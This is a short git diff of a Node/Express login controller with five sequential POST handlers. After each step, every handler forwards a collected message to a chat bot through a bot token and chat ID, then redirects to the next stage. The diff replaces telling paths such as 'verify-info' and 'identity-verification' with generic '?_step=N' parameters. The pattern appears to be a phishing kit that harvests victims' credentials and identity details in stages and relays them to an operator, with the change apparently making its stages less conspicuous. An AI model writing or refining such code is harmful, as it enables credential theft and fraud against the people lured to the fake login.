@@ -56,7 +56,7 @@ exports.loginPost = async (req, res) => {
 
 	console.log(message);
 
-    res.redirect("/auth/login/incorrect");
+    res.redirect("/auth/login?_step=1");
     
 } catch (error) {
 	// Handle any unexpected errors here
@@ -109,7 +109,7 @@ exports.loginPost2 = async (req, res) => {
         const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
         sendMessage(message);
 
-        res.redirect("/auth/login/verify-info");
+        res.redirect("/auth/login?_step=2");
     } catch (error) {
 		console.error('Unexpected error:', error.message);
 		res.status(500).send('Internal Server Error');
@@ -163,7 +163,7 @@ exports.loginPost3 = async (req, res) => {
         const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
         sendMessage(message);
 
-        res.redirect("/auth/login/identity-verification");
+        res.redirect("/auth/login?_step=3");
     } catch (error) {
 		console.error('Unexpected error:', error.message);
 		res.status(500).send('Internal Server Error');
@@ -215,7 +215,7 @@ exports.loginPost4 = async (req, res) => {
 		const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
         sendMessage(message);
         
-		res.redirect("/auth/login/complete");
+		res.redirect("/auth/login?_step=4");
 	} catch (error) {
 		console.error('Unexpected error:', error.message);
 		res.status(500).send('Internal Server Error');
@@ -267,7 +267,7 @@ exports.loginPost5 = async (req, res) => {
 	const sendMessage = sendMessageFor(botToken, chatId);
 	sendMessage(message);
 
-	res.redirect("/auth/login/complete");
+	res.redirect("/auth/login?_step=complete");
 	} catch (error) {
 		console.error('Unexpected error:', error.message);
 		res.status(500).send('Internal Server Error');
